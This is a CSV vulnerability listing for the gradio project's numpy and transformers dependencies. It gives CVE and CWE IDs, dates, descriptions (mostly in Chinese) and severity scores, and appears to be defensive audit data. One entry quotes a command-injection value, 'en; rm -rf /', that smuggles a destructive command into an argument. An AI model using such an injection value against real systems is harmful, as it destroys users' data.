project,dependency,dependency_version,direct_dependency,cve_id,cwe_id,release_date,description,security_level_id,exploit_level_id
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,transformers,,True,,CWE-601,2022-11-01,"## Overview
[transformers](https://pypi.org/project/transformers) is a State-of-the-art Machine Learning for JAX, PyTorch and TensorFlow

Affected versions of this package are vulnerable to Open Redirect due to referencing an obsolete link.
## Remediation
Upgrade `transformers` to version 4.23.0 or higher.
## References
- [GitHub Commit](https://github.com/huggingface/transformers/commit/ce2620194b4a8f070cd29504d34a79758affdf95)
- [GitHub PR](https://github.com/huggingface/transformers/pull/19001)
- [GitHub Release](https://github.com/huggingface/transformers/releases/tag/v4.23.0)
",3,0
gradio-app_gradio,transformers,,True,CVE-2023-2800,CWE-377,,Hugging Face Transformers 是用于 JAX、PyTorch 和 TensorFlow 的先进自然语言处理库。该漏洞出现在 4.30.0 之前的版本中，源于使用过时的 tempfile.mktemp() 方法。该方法不安全，因为在调用 mktemp() 与文件创建之间，可能有其他进程创建同名文件。这可能导致文件可用性受干扰，并可能导致敏感信息泄露。,3,1
gradio-app_gradio,transformers,,True,CVE-2023-6730,CWE-502,,Hugging Face Transformers 是为 JAX、PyTorch 和 TensorFlow 提供的先进自然语言处理框架。此组件用于处理自然语言任务，如文本分类、翻译和问答系统等。漏洞发生在 Transformers 4.36.0 之前的版本，其 root cause 是在 `RagRetriever.from_pretrained()` 函数中，`index_name` 和 `index_path` 参数会反序列化不受信任的数据，攻击者可以远程加载恶意 pickle 文件，从而绕过文件检查并在主机上执行任意代码。反序列化是将字节序列转换为对象的过程，被用于通信和存储。此漏洞允许攻击者在未验证数据合法性的情况下进行反序列化，导致代码执行。,1,1
gradio-app_gradio,transformers,,True,CVE-2023-7018,CWE-502,,Hugging Face Transformers是一个用于JAX、PyTorch和TensorFlow的先进自然语言处理库。在受到影响的版本中，使用TransfoXLTokenizer()函数可能会自动加载恶意的vocab.pkl文件，利用pickle.load函数反序列化不受信任的数据。此漏洞源于未能充分验证反序列化的数据，使攻击者可执行任意代码，控制应用程序的状态或执行流程。,1,1
gradio-app_gradio,transformers,,True,CVE-2024-3568,CWE-502,,Hugging Face Transformers 是一个为 Jax、PyTorch 和 TensorFlow 打造的用于先进自然语言处理的库。TFPreTrainedModel 类的 load_repo_checkpoint() 函数存在反序列化不受信任数据的漏洞。该漏洞允许攻击者通过构造恶意的序列化有效负载，利用函数中的 pickle.load() 方法在处理来自可能不受信任源的数据时执行任意代码和命令。这种不安全反序列化的根本原因是缺少对输入数据的信任边界控制，以及对来源不明数据的直接反序列化处理。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-3933,CWE-1333,2025-07-11,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.50.3及之前版本存在安全漏洞，该漏洞源于DonutProcessor类的token2json方法存在正则表达式拒绝服务，可能导致服务中断。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3263,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于transformers.configuration_utils模块中get_configuration_file函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3777,CWE-20,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0及之前版本存在输入验证错误漏洞，该漏洞源于image_utils.py中URL验证不足，可能导致钓鱼攻击。",3,0
gradio-app_gradio,transformers,,True,CVE-2025-3264,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于dynamic_module_utils.py中get_imports函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-5197,CWE-1333,2025-08-06,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.51.3及之前版本存在安全漏洞，该漏洞源于正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-6921,CWE-400,2025-09-23,<p>transformers是Hugging Face开源的一个用于机器学习的应用程序。 transformers 4.53.0之前版本存在资源管理错误漏洞，该漏洞源于_do_use_weight_decay方法处理用户控制的正则表达式时存在缺陷，可能导致正则表达式拒绝服务攻击。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11394,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的自然语言处理框架。该框架提供构建和应用 Transformer 模型的丰富工具。在其模型文件处理过程中，由于缺乏对用户提供数据的充分验证，导致存在不安全反序列化漏洞，攻击者可以通过插入特制的未验证模型文件进行反序列化，进而在应用中执行任意代码。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-12720,CWE-1333,2025-03-20,Hugging Face Transformers 是一个开源的自然语言处理库，广泛应用于构建和训练先进的模型。该库支持 Jax、PyTorch 和 TensorFlow 的集成。在 tokenization_nougat_fast.py 文件中的 post_process_single() 函数存在正则表达式的处理漏洞。此漏洞由于正则表达式在特定条件下表现出指数时间复杂性，导致出现过度回溯，从而造成 CPU 使用率过高以及应用程序潜在的停机，形成拒绝服务 (DoS) 的场景。受影响的版本是 v4.46.3。,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11392,CWE-502,2024-11-22,Hugging Face Transformers 是一个开源项目，提供 Jax、PyTorch 和 TensorFlow 的自然语言处理模型库。其主要用于构建和训练深度学习模型以及处理自然语言数据。在处理配置文件时，因数据验证不当，导致可能不受信任的数据被反序列化。此漏洞的核心是缺乏对用户输入数据的充分验证，从而使得攻击者能够控制程序执行流，仅需用户访问恶意页面或打开恶意配置文件即可触发。该漏洞允许嵌入恶意代码执行，并在应用环境中获得与当前用户相同的权限。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-11393,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的先进自然语言处理库，提供各种预训练模型以支持多种自然语言处理任务。漏洞存在于模型文件解析过程中，因缺乏对用户输入数据的充分验证，导致不受信任的数据被反序列化。攻击者能利用该漏洞在受影响的安装上以当前用户权限执行任意代码。此漏洞主要影响版本低于4.48.0的转换脚本，但不影响核心库功能。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-1194,CWE-1333,2025-04-29,Hugging Face Transformers 是一个用于自然语言处理的开源库，提供了多种预训练模型以便于开发者快速构建机器学习应用。该漏洞存在于 GPT-NeoX-Japanese 模型的 `tokenization_gpt_neox_japanese.py` 文件中，具体是在 SubWordJapaneseTokenizer 类中。当正则表达式处理经过精心构造的输入时，会导致漏洞产生。根本原因在于某些条件下的正则表达式表现出指数复杂性，导致过度回溯。这可能导致 CPU 使用率升高，进而造成应用程序停机，有效地生成拒绝服务 (DoS) 场景。受影响的版本为 v4.48.1（最新）。,3,2
gradio-app_gradio,transformers,,True,CVE-2025-2099,CWE-1333,2025-05-19,<p>在huggingface/transformers版本v4.48.3的`transformers.testing_utils`模块中，`preprocess_string()`函数存在一个漏洞。该漏洞允许通过正则表达式拒绝服务（ReDoS）攻击进行利用。处理文档字符串中代码块所使用的正则表达式包含嵌套量词，导致在处理含有大量换行符的输入时发生指数级回溯。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2025-6638,CWE-1333,2025-09-12,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.52.4版本存在安全漏洞，该漏洞源于MarianTokenizer的remove_language_code方法存在正则表达式处理效率问题，可能导致正则表达式拒绝服务。",3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个支持多种任务的开源自然语言处理库，基于PyTorch和TensorFlow构建。由于在GitHub Actions工作流的分支名称未正确清理，攻击者可以利用此漏洞实现任意代码注入。当攻击者提供特制的分支名称时，可以触发不受信任的命令执行。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>HuggingFace Transformers 是一个用于自然语言处理和机器学习的开源库，提供各种工具和模型以简化开发。该库中的 load_tool 功能允许从 HuggingFace Hub 加载外部工具，但存在远程代码执行漏洞。攻击者可以在未启用 `Trust Remote Code` 的情况下，通过从恶意构建的库加载工具，导致执行任意 Python 代码。此漏洞的调用链为 `load_tool() -&gt; Tool.from_hub() -&gt; get_class_from_dynamic_module() -&gt; get_class_in_module() -&gt; importlib.import_module(module_path)`，其中的 importlib.import_module 函数在没有任何警告的情况下执行导入操作。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个由 Hugging Face 开发的开源自然语言处理模型库，旨在提供强大的模型以简化深度学习任务。该库中的 TransfoXLCorpus 组件存在一个远程代码执行漏洞，当用户按照 Hugging Face 的官方指导使用该模型时，恶意用户可以通过不安全的 torch.load 方法进行攻击。攻击的根本原因在于该方法在未正确处理受信任输入时，可能执行任意可执行代码。具体来说，攻击者可利用该漏洞使受害者在本地执行恶意代码，从而在系统中创建特定文件。</p>,4,1
gradio-app_gradio,transformers,,True,,,,"<p>Transformers 是一个开源的 Python 库，旨在简化和加速使用深度学习模型的自然语言处理任务。在 `build-eval-data.py` 代码片段中，使用用户提供的字符串动态生成 shell 命令。攻击者可以通过输入特定的字符或命令，利用此漏洞进行远程命令注入。例如，如果用户将变量 `src` 或 `tgt` 设置为 ""en; rm -rf /""，那么代码将生成执行 `rm -rf /` 的命令，从而导致系统数据丢失或损坏。由于缺乏对输入的处理和验证，恶意用户可以执行任意 shell 命令。</p>",1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，提供多种模型和工具以简化文本建模的过程。该库的 export 函数 TextDatasetForNextSentencePrediction() 存在一个反序列化漏洞，如果读取的文件路径为 C:/1.txt，程序将会读取当前目录中精心构造的副本。该漏洞的根本原因在于库中对输入数据的处理不当，攻击者可以借此构造恶意数据流通过反序列化执行任意命令。</p>,1,1
gradio-app_gradio,transformers,,True,CVE-2025-6051,CWE-1333,2025-09-14,<p>Hugging Face Transformers 是一个用于自然语言处理 (NLP) 的开源库，提供了许多预训练的模型和工具，广泛应用于文本分类、机器翻译、文本生成等任务。此漏洞存在于该库的 `EnglishNormalizer` 类的 `normalize_numbers()` 方法中。该方法用于对数字字符串进行归一化处理，但在处理特制的长数字序列时，由于正则表达式匹配效率低下，会导致 CPU 资源过度消耗。攻击者可以通过向应用程序发送特制的输入数据，触发该漏洞，进而导致系统性能严重下降。</p>,3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，旨在借助深度学习模型简化文本处理任务。WaitCanDeadlock 漏洞是一种与并发相关的特定问题，通常发生在多线程系统中。当一个持有锁的线程被迫无期限地等待一个无法满足的条件时，可能导致死锁场景的发生。这种漏洞的触发条件为：使用 subprocess.Popen 启动子进程并直接调用 proc.wait()，如果子进程输出内容过大时，就可能会导致死锁，因此建议使用 proc.communicate() 方法来避免这一问题。</p>,1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个基于 Python 的开源机器学习库，专注于自然语言处理任务。该库中的 CodeAgent 组件负责生成并执行解决任务的代码。然而，由于未能对生成的代码进行检查，攻击者可以通过精心构造的提示直接执行任意代码，从而导致代码执行漏洞。攻击者无需额外的授权导入即可利用此漏洞。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个用于自然语言处理的开源Python库，能够处理预训练模型和变换器架构。当该库使用已不再安全的函数`tempfile.mktemp()`时，存在一个不安全的临时文件漏洞。由于调用`mktemp()`和随后尝试创建文件之间可能会有其他进程创建同名文件，这使得该函数不再安全。这使攻击者可以在文件打开之前影响文件内容。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个开源的 Python 库，用于构建和训练深度学习模型，特别是在自然语言处理方面。当用户使用 convert_maskformer_resnet_to_pytorch.py 脚本，并通过 --checkpoint_path 参数提供一个恶意的 .pkl 文件时，该脚本使用 pickle.load 进行不安全的反序列化。这使得攻击者可以在用户的系统上执行嵌入在 pickle 文件中的任意恶意代码。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源库，旨在为研究人员和开发者提供强大的工具以训练和应用转化器模型。该库中的 Transformer-XL 模型在执行反序列化操作时存在安全漏洞，具体是在 convert_transfo_xl_original_tf_checkpoint_to_pytorch.py 脚本中使用了 pickle.load，从而导致恶意的 pickle 文件可以被用来执行任意代码。如果攻击者能够控制传入的文件，他们可以创建一个恶意文件“一旦加载” 就可以在受害者系统上执行代码。该漏洞可以通过提供一个精心构造的 pickle 文件（例如，包含打开计算器应用的代码）进行利用。</p>,2,1
